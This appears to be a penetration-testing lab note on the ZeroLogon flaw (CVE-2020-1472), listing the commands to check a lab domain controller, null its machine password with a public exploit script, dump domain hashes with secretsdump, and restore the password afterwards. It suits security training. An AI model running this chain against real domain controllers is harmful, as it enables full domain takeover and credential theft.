

### DISCLAIMER:
**VERY VERY VERY DANGEROUS, VERY CRITICAL**


if you exploit this then you NEED to also use the restore it after the fact

- what does it do?
	- Set the authentication to NULL on the DC




## Lab

```
python3 zerologon_check.py HYDRA-DC 192.168.176.129
```

```
python3 cve-2020-1472-exploit.py HYDRA-DC 192.168.176.129
```

```
secretsdump -just-dc MARVEL/HYDRA-DC\$@192.168.176.129
```

**TO RESTORE THE MACHINE**

using the administrator hash

```
secretsdump.py administrator@192.168.176.129 -hashes LM:NTHASH
```

Look for the `plain_password_hex` and copy it

```
python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.176.129 -hexpass
```

---


What is ZeroLogon? - [https://www.trendmicro.com/en_us/what-is/zerologon.html](https://www.trendmicro.com/en_us/what-is/zerologon.html)

dirkjanm CVE-2020-1472 - [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

SecuraBV ZeroLogon Checker - [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)